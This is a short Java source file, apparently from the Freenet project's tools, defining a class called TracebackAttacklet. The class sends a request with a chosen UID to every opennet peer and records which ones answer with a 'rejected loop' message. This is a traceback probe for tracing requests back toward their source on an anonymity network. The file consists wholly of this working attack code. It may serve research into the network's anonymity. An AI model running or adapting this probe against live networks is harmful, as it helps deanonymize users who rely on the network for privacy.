package freenet.tools;

import freenet.io.comm.ByteCounter;
import freenet.io.comm.DMT;
import freenet.io.comm.Message;
import freenet.io.comm.MessageFilter;
import freenet.io.comm.NotConnectedException;
import freenet.keys.NodeCHK;
import freenet.node.*;
import freenet.support.Logger;

public class TracebackAttacklet {
	
	private Node node;
	
	public TracebackAttacklet(Node n)
	{
		node = n;
	}
	
	public void attack(long uid, int htl, StringBuilder status)
	{
		boolean isSSK = false;
		ByteCounter ctr = isSSK ? node.nodeStats.sskRequestCtr : node.nodeStats.chkRequestCtr;
		
		// dummy routing key
		byte[] routingKey = new byte[32];
		byte cryptoAlgorithm = 0;
		NodeCHK nodeChk = new NodeCHK(routingKey, cryptoAlgorithm);
		
		Message m = DMT.createFNPCHKDataRequest(uid, (short)0, nodeChk);
		OpennetPeerNode[] neighbors = node.peers.getOpennetPeers();
		for( OpennetPeerNode n : neighbors)
		{
			try {
				status.append("Result:"+ n.getPeer()+":"+htl+":");
				n.sendSync(m, ctr);
			
				MessageFilter mfAccepted = MessageFilter.create().setSource(n).setField(DMT.UID, uid).setTimeout(5000).setType(DMT.FNPRejectedLoop);
				Message msg = node.usm.waitFor(mfAccepted, null);
				if (msg==null || (msg.getSpec() != DMT.FNPRejectedLoop)) {
					status.append("false\n");
					continue;
				}
				status.append("true\n");
			} catch (Exception e) {
			}
		}
		status.append("Attack_Complete\n");
	}
}
